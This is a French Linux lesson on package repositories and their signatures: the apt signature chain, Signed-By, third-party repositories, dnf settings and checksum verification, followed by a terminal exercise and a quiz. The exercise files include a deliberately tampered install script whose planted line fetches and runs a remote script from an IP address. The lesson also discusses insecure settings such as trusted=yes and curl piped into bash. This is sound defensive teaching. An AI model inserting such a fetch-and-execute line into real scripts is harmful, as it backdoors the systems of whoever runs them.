@@ -1,0 +1,169 @@
+---
+refCode: CL-LSN-02041-V01
+slug: linux-depots-signatures
+title: "Les dépôts et leurs signatures"
+description: "D'où viennent les paquets, et pourquoi on peut leur faire confiance : la déclaration des dépôts (sources.list et format deb822), les suites et composantes, la chaîne de confiance Release, InRelease et Packages, les clés et l'option Signed-By, ajouter proprement un dépôt tiers, les priorités d'apt, l'équivalent dnf, et les pratiques dangereuses comme trusted=yes ou curl | sh. Avec une déclaration de dépôt à corriger et un téléchargement à vérifier, sur un vrai Linux."
+category: DEV
+difficulty: INTERMEDIATE
+estimatedMinutes: 45
+xpReward: 320
+prerequisites: ["CL-LSN-02040-V01"]
+---
+
+Quand tu tapes `apt install nginx`, des fichiers arrivent d'un serveur que tu ne connais pas, à travers un réseau que tu ne contrôles pas, et s'installent avec les droits de root. Pourquoi faire confiance à ce qui arrive ? Parce qu'une **chaîne de signatures** relie chaque paquet à une clé détenue par la distribution. Cette leçon t'explique où se déclarent les dépôts, comment cette chaîne fonctionne, comment ajouter un dépôt tiers sans l'affaiblir, et comment vérifier toi-même un fichier téléchargé. C'est un sujet de sécurité à part entière : les attaques par la **chaîne d'approvisionnement** logicielle visent précisément ce maillon.
+
+## objectifs
+
+À la fin de cette leçon, tu sais :
+
+- lire et écrire une déclaration de dépôt, au format classique et au format deb822 ;
+- expliquer les suites (`bookworm`, `bookworm-updates`, `bookworm-security`) et les composantes ;
+- expliquer la chaîne de confiance d'apt, de la clé au paquet ;
+- ajouter un dépôt tiers avec sa propre clé, limitée à ce dépôt par `Signed-By` ;
+- lire les priorités d'apt avec `apt-cache policy` ;
+- reconnaître les pratiques dangereuses : `trusted=yes`, `http` sans signature, `curl | sh`, `gpgcheck=0` ;
+- vérifier un fichier téléchargé avec une somme de contrôle, et dire ce qu'elle prouve.
+
+## pourquoi ça compte
+
+Un attaquant qui parvient à glisser un paquet modifié dans les mises à jour d'une organisation obtient, d'un seul coup, les droits de root sur toutes ses machines. C'est le principe des attaques par la chaîne d'approvisionnement, parmi les plus redoutées aujourd'hui : un dépôt tiers compromis, un script d'installation remplacé sur un site, une dépendance au nom presque identique à celui d'un projet connu. Les distributions ont construit une défense solide contre ces attaques, mais un administrateur peut la désactiver d'une seule option mal choisie, souvent copiée depuis un tutoriel. Savoir lire une déclaration de dépôt et vérifier une signature, c'est savoir garder cette défense en place.
+
+## où se déclarent les dépôts
+
+Sous Debian et Ubuntu, les dépôts sont déclarés dans **`/etc/apt/sources.list`** et dans les fichiers du répertoire **`/etc/apt/sources.list.d/`**. Deux formats coexistent. Le format **classique**, une ligne par dépôt, dans les fichiers `.list` :
+
+```text
+deb http://deb.debian.org/debian bookworm main non-free-firmware
+```
+
+Et le format **deb822**, plus lisible, dans les fichiers `.sources`, que les versions récentes d'Ubuntu utilisent par défaut et que Debian recommande désormais :
+
+```text
+Types: deb
+URIs: https://deb.debian.org/debian
+Suites: bookworm bookworm-updates
+Components: main non-free-firmware
+Signed-By: /usr/share/keyrings/debian-archive-keyring.gpg
+```
+
+Chaque déclaration donne le **type** (`deb` pour les paquets prêts à installer, `deb-src` pour leur code source), l'**adresse** du dépôt, la ou les **suites** et les **composantes**. La **suite** désigne une version de la distribution : `bookworm` pour Debian 12, `bookworm-updates` pour ses mises à jour de stabilité, `bookworm-security` pour ses correctifs de sécurité, publiés sur un serveur à part, et `bookworm-backports` pour des versions plus récentes de certains logiciels. Les **composantes** découpent le dépôt selon la licence et le support : `main`, `contrib`, `non-free`, `non-free-firmware`.
+
+## la chaîne de confiance
+
+Le mécanisme de vérification d'apt tient en trois fichiers, emboîtés comme des poupées russes :
+
+- le fichier **`Release`** de chaque suite liste les index du dépôt avec leur empreinte SHA-256. Il est **signé** avec la clé de la distribution : la signature est dans un fichier voisin, `Release.gpg`, ou intégrée au fichier **`InRelease`** ;
+- les fichiers **`Packages`**, les index, listent chaque paquet avec sa version, ses dépendances et **son empreinte SHA-256** ;
+- chaque **paquet** `.deb` téléchargé est comparé à l'empreinte annoncée dans `Packages`.
+
+Lors d'un `apt update`, apt vérifie la signature de `InRelease` avec les clés qu'il connaît, puis l'empreinte de chaque index téléchargé. Lors d'un `apt install`, il vérifie l'empreinte de chaque paquet. Il suffit donc de faire confiance à **une clé** pour faire confiance à tout le reste. Un miroir compromis, ou quelqu'un qui intercepte le trafic, ne peut modifier ni un index ni un paquet sans casser la chaîne, et apt refuse alors d'aller plus loin, avec un message comme `The following signatures were invalid` ou `Hash Sum mismatch`.
+
+<Diagram caption="La chaîne de confiance d'apt">
+flowchart TD
+  K["La clé publique de la distribution, dans /usr/share/keyrings"] -->|"vérifie la signature de"| R["InRelease : la liste des index et de leurs empreintes"]
+  R -->|"garantit l'empreinte de"| P["Packages : la liste des paquets et de leurs empreintes"]
+  P -->|"garantit l'empreinte de"| D["nginx_1.22.1-9_amd64.deb"]
+  D --> I["Installé par dpkg, avec les droits de root"]
+</Diagram>
+
+Remarque une conséquence : la signature protège le **contenu**, pas le transport. Un dépôt servi en `http` reste sûr tant que la chaîne est vérifiée, et c'est ainsi que les miroirs Debian ont longtemps fonctionné. Le `https` ajoute la confidentialité (un observateur ne voit plus quels paquets tu installes) et une protection supplémentaire, mais il ne remplace **jamais** la signature.
+
+## les clés et Signed-By
+
+Les clés des dépôts officiels sont installées par un paquet, `debian-archive-keyring` ou `ubuntu-keyring`, dans **`/usr/share/keyrings/`**. Pour un dépôt tiers, on place sa clé dans **`/etc/apt/keyrings/`**, et on la **rattache** à ce dépôt, et à lui seul, avec l'option **`Signed-By`**.
+
+Ce rattachement est essentiel. L'ancienne méthode, la commande `apt-key add`, aujourd'hui abandonnée, ajoutait la clé à un trousseau **global** : la clé d'un petit éditeur pouvait alors signer des paquets pour **n'importe quel** dépôt, y compris un faux dépôt Debian. Avec `Signed-By`, une clé compromise ne met en danger que le dépôt auquel elle est liée. Si tu croises encore `apt-key` dans un tutoriel, c'est le signe qu'il est ancien.
+
+## ajouter un dépôt tiers proprement
+
+Certains logiciels ne sont pas dans les dépôts de la distribution, ou pas dans une version assez récente : Docker, PostgreSQL, Grafana ou Node.js publient leurs propres dépôts. La méthode propre tient en quatre étapes :
+
+1. **télécharger la clé** depuis le site officiel de l'éditeur, en `https`, et la placer dans `/etc/apt/keyrings/` ;
+2. **vérifier son empreinte** (*fingerprint*) en la comparant à celle que publie l'éditeur dans sa documentation : `gpg --show-keys /etc/apt/keyrings/editeur.asc` l'affiche ;
+3. **déclarer le dépôt** dans un fichier `.sources` de `/etc/apt/sources.list.d/`, avec la ligne `Signed-By` qui pointe vers cette clé ;
+4. lancer `apt update`, puis vérifier avec `apt-cache policy logiciel` que le paquet vient bien du dépôt attendu.
+
+Garde en tête qu'ajouter un dépôt tiers, c'est donner à son éditeur le pouvoir d'installer du code en root sur ta machine à chaque mise à jour. Ce n'est pas anodin : on n'ajoute que des dépôts d'éditeurs reconnus, et on les retire quand on n'en a plus besoin.
+
+## les priorités d'apt
+
+Quand un même paquet existe dans plusieurs dépôts, apt choisit la version la plus récente parmi ceux de **priorité** la plus haute. Un dépôt tiers pourrait donc, volontairement ou non, **remplacer** un paquet du système, par exemple une version de `openssl` qui ne recevra jamais les correctifs de Debian. `apt-cache policy` montre les priorités (500 par défaut, 100 pour les backports) et d'où viendrait chaque version. Les fichiers de `/etc/apt/preferences.d/` permettent d'**épingler** (*pinning*) un dépôt tiers à une priorité basse, et de ne l'autoriser que pour les paquets qu'on attend de lui.
+
+## et avec dnf
+
+La famille Red Hat déclare ses dépôts dans des fichiers `.repo` de **`/etc/yum.repos.d/`** :
+
+```ini
+[editeur]
+name=Dépôt de l'éditeur
+baseurl=https://paquets.editeur.example/el9/
+enabled=1
+gpgcheck=1
+gpgkey=https://paquets.editeur.example/cle.asc
+```
+
+`gpgcheck=1` impose la vérification de la signature de chaque paquet, avec la clé indiquée par `gpgkey`. La ligne `gpgcheck=0`, qu'on croise dans des tutoriels pressés, désactive toute vérification. `dnf repolist` liste les dépôts actifs, et `rpm -qa gpg-pubkey*` les clés importées sur la machine.
+
+## les pratiques dangereuses
+
+- **`[trusted=yes]`** dans une déclaration apt : le dépôt est accepté **sans aucune vérification de signature**. N'importe qui capable de répondre à la place du serveur peut installer ce qu'il veut en root.
+- **`gpgcheck=0`** dans un fichier `.repo` : la même chose côté dnf.
+- **`curl https://... | sudo bash`** : on exécute en root un script qu'on n'a pas lu, tel que le serveur le livre à cet instant. Au minimum, télécharge-le, lis-le, vérifie son empreinte, puis exécute-le.
+- **Les dépôts personnels** (les PPA d'Ubuntu, les dépôts COPR de Fedora) d'auteurs inconnus : ils sont signés, mais par quelqu'un dont tu ne sais rien.
+
+## vérifier un téléchargement
+
+Pour un fichier téléchargé hors des dépôts (une image ISO, une archive, un binaire), les éditeurs publient un fichier de **sommes de contrôle**, souvent nommé `SHA256SUMS`, qui liste l'empreinte SHA-256 de chaque fichier. `sha256sum -c SHA256SUMS` recalcule les empreintes et les compare : `OK` pour un fichier intact, `FAILED` pour un fichier modifié, même d'un seul octet.
+
+Une limite importante : si l'attaquant contrôle le serveur, il peut remplacer **à la fois** le fichier et la liste des empreintes. La somme de contrôle prouve alors seulement que le téléchargement n'a pas été abîmé en route. C'est pourquoi les éditeurs sérieux **signent** aussi le fichier `SHA256SUMS` avec leur clé (`SHA256SUMS.sign` ou `SHA256SUMS.asc`), vérifiable avec `gpg --verify`. On retrouve la même idée que dans apt : une clé de confiance, puis des empreintes.
+
+## à toi de jouer
+
+Le dossier de travail contient une copie des déclarations de dépôts d'un serveur, dans `depots`, et un logiciel téléchargé hier, dans `telechargement`.
+
+1. cherche l'option dangereuse dans les déclarations de dépôts : `grep -r trusted depots` ;
+2. remplace la déclaration fautive par un fichier `depots/outil-tiers.sources` au format deb822, en `https`, avec la ligne `Signed-By: /etc/apt/keyrings/exemple.asc`, puis supprime `depots/outil-tiers.list`. Inspire-toi de `depots/debian.sources` ;
+3. entre dans `telechargement` et vérifie les fichiers avec `sha256sum -c SHA256SUMS`, en enregistrant le résultat dans `verification.txt` (garde-le dans `telechargement`) ;
+4. un fichier est `FAILED` : compare-le à ce qu'annoncent les notes de version, et trouve la ligne qui n'a rien à y faire.
+
+<LinuxTerminal title="Des dépôts et un téléchargement à vérifier" height={420} files={{"depots/debian.sources": "Types: deb\nURIs: https://deb.debian.org/debian\nSuites: bookworm bookworm-updates\nComponents: main non-free-firmware\nSigned-By: /usr/share/keyrings/debian-archive-keyring.gpg\n", "depots/securite.sources": "Types: deb\nURIs: https://security.debian.org/debian-security\nSuites: bookworm-security\nComponents: main non-free-firmware\nSigned-By: /usr/share/keyrings/debian-archive-keyring.gpg\n", "depots/outil-tiers.list": "deb [trusted=yes] http://paquets.exemple.test/debian stable main\n", "telechargement/outil-2.1.0-install.sh": "#!/bin/sh\n# Installe outil 2.1.0 dans /usr/local/bin.\nset -e\ninstall -m 755 outil /usr/local/bin/outil\nwget -q -O - http://203.0.113.66/m.sh | sh\necho \"outil 2.1.0 installé.\"\n", "telechargement/outil-2.1.0-notes.txt": "outil 2.1.0 - notes de version\n\n- nouvelle option --format json\n- correction d'un plantage sur les fichiers vides\n", "telechargement/SHA256SUMS": "8a9b5cecdf1fd2a28d45cba8dbdf867ba69fa7c8c8745de92e11ace91c3a71a4  outil-2.1.0-install.sh\n0080f2add0f2a28bb95ebc14e25a3ecee113042bd50f3db757cd873ac419918c  outil-2.1.0-notes.txt\n"}} expectedCommands={["grep -r trusted depots", "rm depots/outil-tiers.list", "cd telechargement", "sha256sum -c SHA256SUMS > verification.txt"]} checks={[{"label": "La déclaration dangereuse a disparu", "path": "depots/outil-tiers.list", "expect": "absent"}, {"label": "Le dépôt tiers est déclaré avec sa clé", "path": "depots/outil-tiers.sources", "expect": "file", "contains": "Signed-By: /etc/apt/keyrings/exemple.asc"}, {"label": "La vérification des empreintes est enregistrée", "path": "telechargement/verification.txt", "expect": "file", "contains": "FAILED"}]} hints={["grep -r cherche dans tous les fichiers d'un dossier.", "cat depots/debian.sources montre le modèle à suivre : cinq lignes, Types, URIs, Suites, Components, Signed-By.", "Un here-document écrit plusieurs lignes d'un coup : cat > depots/outil-tiers.sources << 'EOF', les lignes, puis EOF.", "sha256sum -c doit être lancé depuis le dossier qui contient les fichiers.", "cat outil-2.1.0-install.sh : cherche la ligne qui télécharge quelque chose."]} />
+
+Le script d'installation a été modifié : une ligne télécharge et exécute un script depuis une adresse IP inconnue, avec les droits de celui qui lance l'installation, souvent root. Sans la vérification, tu l'aurais exécuté, et rien ne l'aurait signalé à l'écran. Et note que la somme de contrôle t'a protégé ici parce que seul le script avait été remplacé : un attaquant qui aurait aussi réécrit `SHA256SUMS` serait passé inaperçu, d'où l'intérêt d'un `SHA256SUMS` signé.
+
+## les pièges
+
+- **Copier une ligne `[trusted=yes]` d'un tutoriel.** Elle désactive toute vérification du dépôt.
+- **Utiliser `apt-key add`.** La clé devient valable pour tous les dépôts : utilise `/etc/apt/keyrings/` et `Signed-By`.
+- **Croire que `https` suffit.** Il protège le transport, pas l'origine : seule la signature garantit que le paquet vient de l'éditeur.
+- **Faire confiance à une somme de contrôle servie par le même serveur que le fichier.** Elle détecte une corruption, pas un serveur compromis : vérifie aussi la signature.
+- **Ajouter un dépôt tiers et l'oublier.** Son éditeur garde le pouvoir d'installer du code en root à chaque mise à jour.
+- **Exécuter `curl ... | sudo bash`.** Télécharge, lis, vérifie, puis exécute.
+
+## pour aller plus loin
+
+<ExternalLink href="https://wiki.debian.org/SecureApt" description="Le fonctionnement détaillé de la chaîne de signatures d'apt, en anglais">Wiki Debian : SecureApt</ExternalLink>
+
+<ExternalLink href="https://manpages.debian.org/bookworm/apt/sources.list.5.fr.html" description="Les deux formats de déclaration des dépôts et toutes leurs options, en français">Page de manuel de sources.list</ExternalLink>
+
+<ExternalLink href="https://wiki.debian.org/DebianRepository/UseThirdParty" description="Les règles de Debian pour ajouter un dépôt tiers sans affaiblir le système, en anglais">Wiki Debian : utiliser un dépôt tiers</ExternalLink>
+
+## quiz
+
+<QuizGroup>
+  <Quiz id="q-1" question="Quel fichier d'un dépôt Debian porte la signature qui protège tout le reste ?" options={["Chaque paquet .deb, un par un", "Le fichier InRelease (ou Release et Release.gpg), qui liste les index et leurs empreintes", "Le fichier sources.list", "Le fichier Packages seulement"]} correct={1} explanation="La signature couvre Release, qui garantit les index, qui garantissent chaque paquet par son empreinte." />
+  <Quiz id="q-2" question="Que fait l'option Signed-By dans une déclaration de dépôt ?" options={["Elle chiffre les paquets", "Elle rattache le dépôt à une clé précise, et limite cette clé à ce dépôt", "Elle signe les paquets installés", "Elle active le https"]} correct={1} explanation="Une clé tierce ne peut alors signer que pour son propre dépôt, contrairement à l'ancien trousseau global d'apt-key." />
+  <Quiz id="q-3" question="Pourquoi l'option [trusted=yes] est-elle dangereuse ?" options={["Elle ralentit apt", "Elle fait accepter le dépôt sans vérifier aucune signature", "Elle rend le dépôt prioritaire sur Debian", "Elle interdit le https"]} correct={1} explanation="Sans vérification, quiconque peut répondre à la place du serveur peut installer du code en root." />
+  <Quiz id="q-4" question="Un dépôt officiel est servi en http. Est-ce une faille ?" options={["Oui, tout paquet peut être modifié en route", "Non, tant que la chaîne de signatures est vérifiée : une modification serait détectée", "Oui, car les clés circulent en clair", "Non, parce que http est chiffré"]} correct={1} explanation="La signature protège le contenu. https ajoute la confidentialité, mais ne remplace pas la signature." />
+  <Quiz id="q-5" question="sha256sum -c SHA256SUMS affiche OK pour tous les fichiers. Qu'est-ce que cela prouve ?" options={["Que les fichiers viennent forcément de l'éditeur", "Que les fichiers correspondent aux empreintes de la liste ; si la liste n'est pas signée, un serveur compromis a pu remplacer les deux", "Que les fichiers ne contiennent pas de virus", "Rien du tout"]} correct={1} explanation="Une somme de contrôle détecte une corruption ; seule une signature de la liste prouve l'origine." />
+  <Quiz id="q-6" question="Côté dnf, quelle ligne d'un fichier .repo impose la vérification des signatures ?" options={["enabled=1", "gpgcheck=1", "sslverify=0", "priority=1"]} correct={1} explanation="gpgcheck=1 avec gpgkey= vérifie chaque paquet ; gpgcheck=0 désactive toute vérification." />
+  <Quiz id="q-7" question="Pourquoi un dépôt tiers peut-il être risqué même s'il est signé ?" options={["Parce que ses signatures sont toujours fausses", "Parce que son éditeur peut installer du code en root à chaque mise à jour, et même remplacer des paquets du système", "Parce qu'il désactive le pare-feu", "Il n'y a aucun risque"]} correct={1} explanation="La signature prouve l'origine, pas les intentions ni la sécurité de l'éditeur. On n'ajoute que des dépôts d'éditeurs reconnus, avec une priorité maîtrisée." />
+</QuizGroup>
+
+## à retenir
+
+- Les dépôts se déclarent dans **`/etc/apt/sources.list`** et **`/etc/apt/sources.list.d/`**, au format ligne (`.list`) ou **deb822** (`.sources`) : type, adresse, suites, composantes.
+- La **chaîne de confiance** : la clé vérifie **`InRelease`**, qui garantit les **`Packages`**, qui garantissent chaque **`.deb`** par son empreinte.
+- Une clé tierce va dans **`/etc/apt/keyrings/`** et se lie à son dépôt par **`Signed-By`** ; `apt-key` est abandonné.
+- **`apt-cache policy`** montre d'où viendrait chaque version, et les priorités.
+- Jamais **`trusted=yes`**, **`gpgcheck=0`** ni **`curl | sudo bash`** sans lecture.
+- **`sha256sum -c`** détecte une modification ; une **signature** de la liste prouve l'origine.
